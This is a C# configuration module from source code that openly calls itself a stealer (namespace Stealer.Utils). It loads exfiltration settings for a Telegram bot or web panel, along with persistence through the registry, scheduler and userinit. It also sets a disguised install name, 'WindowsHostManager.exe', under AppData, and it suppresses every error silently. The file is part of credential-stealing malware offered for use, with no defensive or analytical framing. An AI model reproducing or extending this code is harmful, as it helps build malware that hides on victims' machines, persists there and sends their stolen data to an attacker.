using System;
using System.IO;
using System.Reflection;
using System.Text;

namespace Stealer.Utils
{
    public static class Config
    {
        public static string Delivery { get; private set; } = "TELEGRAM";
        public static string BotToken { get; private set; } = "";
        public static string ChatId { get; private set; } = "";
        public static string PanelUrl { get; private set; } = "";
        public static string SecretKey { get; private set; } = "";
        public static string Persistence { get; private set; } = "registry,scheduler,userinit";
        public static string InstallFolder { get; private set; } = "%ApplicationData%";
        public static string InstallName   { get; private set; } = "WindowsHostManager.exe";
        
        private static bool _initialized = false;

        public static void Initialize()
        {
            if (_initialized) return;

            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                string[] possibleNames = {
                    "config.json",
                };

                Stream stream = null;
                foreach (var name in possibleNames)
                {
                    stream = assembly.GetManifestResourceStream(name);
                    if (stream != null)
                    {
                        break;
                    }
                }

                if (stream != null)
                {
                    using (stream)
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        string json = reader.ReadToEnd();
                        
                        // Parse JSON keys manually to avoid NewtonSoft.Json dependency
                        Delivery = ParseJsonKey(json, "delivery").Trim().TrimEnd('\0', ' ');
                        BotToken = ParseJsonKey(json, "botToken").Trim().TrimEnd('\0', ' ');
                        ChatId = ParseJsonKey(json, "chatId").Trim().TrimEnd('\0', ' ');
                        PanelUrl = ParseJsonKey(json, "panelUrl").Trim().TrimEnd('\0', ' ');
                        SecretKey = ParseJsonKey(json, "secretKey").Trim().TrimEnd('\0', ' ');
                        Persistence    = ParseJsonKey(json, "persistence").Trim().TrimEnd('\0', ' ');
                        var rawFolder  = ParseJsonKey(json, "installFolder").Trim().TrimEnd('\0', ' ');
                        var rawName    = ParseJsonKey(json, "installName").Trim().TrimEnd('\0', ' ');
                        if (!string.IsNullOrEmpty(rawFolder)) InstallFolder = rawFolder;
                        if (!string.IsNullOrEmpty(rawName))   InstallName   = rawName;
                    }
                }
            }
            catch
            {
            }

            _initialized = true;
        }

        private static string ParseJsonKey(string json, string key)
        {
            try
            {
                string searchKey = $"\"{key}\":\"";
                int start = json.IndexOf(searchKey);
                if (start >= 0)
                {
                    start += searchKey.Length;
                    int end = json.IndexOf("\"", start);
                    if (end > start)
                    {
                        return json.Substring(start, end - start);
                    }
                }
            }
            catch { }
            return "";
        }
    }
}
